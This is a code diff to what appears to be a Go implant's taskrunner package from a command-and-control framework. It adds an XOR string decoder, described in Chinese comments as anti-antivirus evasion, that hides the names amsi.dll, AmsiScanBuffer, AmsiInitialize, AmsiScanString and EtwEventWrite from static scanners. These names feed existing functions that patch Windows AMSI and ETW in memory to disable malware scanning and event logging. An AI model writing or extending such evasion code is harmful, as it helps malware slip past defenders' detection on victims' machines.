@@ -21,6 +21,7 @@ package taskrunner
 import (
 	"bytes"
 	"encoding/binary"
+	"encoding/hex"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -196,12 +197,31 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
+// xorDecode 免杀 R-5②：解码「hex(密文):hex(pad)」混淆串（构建期 ObfuscateHexPair
+// 注入，随机 pad），rodata 不含模块名字面量。格式错误时原样返回（降级路径）。
+func xorDecode(s string) string {
+	parts := strings.SplitN(s, ":", 2)
+	if len(parts) != 2 {
+		return s
+	}
+	enc, eerr := hex.DecodeString(parts[0])
+	pad, perr := hex.DecodeString(parts[1])
+	if eerr != nil || perr != nil || len(enc) != len(pad) {
+		return s
+	}
+	raw := make([]byte, len(enc))
+	for i := range enc {
+		raw[i] = enc[i] ^ pad[i]
+	}
+	return string(raw)
+}
+
 func patchAmsi() error {
-	// load amsi.dll
-	amsiDLL := windows.NewLazyDLL("amsi.dll")
-	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
-	amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
-	amsiScanString := amsiDLL.NewProc("AmsiScanString")
+	// load amsi.dll（R-5②：模块名经 ObfuscateHexPair 混淆注入，运行时解码）
+	amsiDLL := windows.NewLazyDLL(xorDecode(`{{ObfuscateHexPair "amsi.dll"}}`))
+	amsiScanBuffer := amsiDLL.NewProc(xorDecode(`{{ObfuscateHexPair "AmsiScanBuffer"}}`))
+	amsiInitialize := amsiDLL.NewProc(xorDecode(`{{ObfuscateHexPair "AmsiInitialize"}}`))
+	amsiScanString := amsiDLL.NewProc(xorDecode(`{{ObfuscateHexPair "AmsiScanString"}}`))
 
 	// patch
 	amsiAddr := []uintptr{
@@ -239,7 +259,7 @@ func patchAmsi() error {
 
 func patchEtw() error {
 	ntdll := windows.NewLazyDLL("ntdll.dll")
-	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
+	etwEventWriteProc := ntdll.NewProc(xorDecode(`{{ObfuscateHexPair "EtwEventWrite"}}`))
 
 	// patch
 	patch := byte(0xC3)
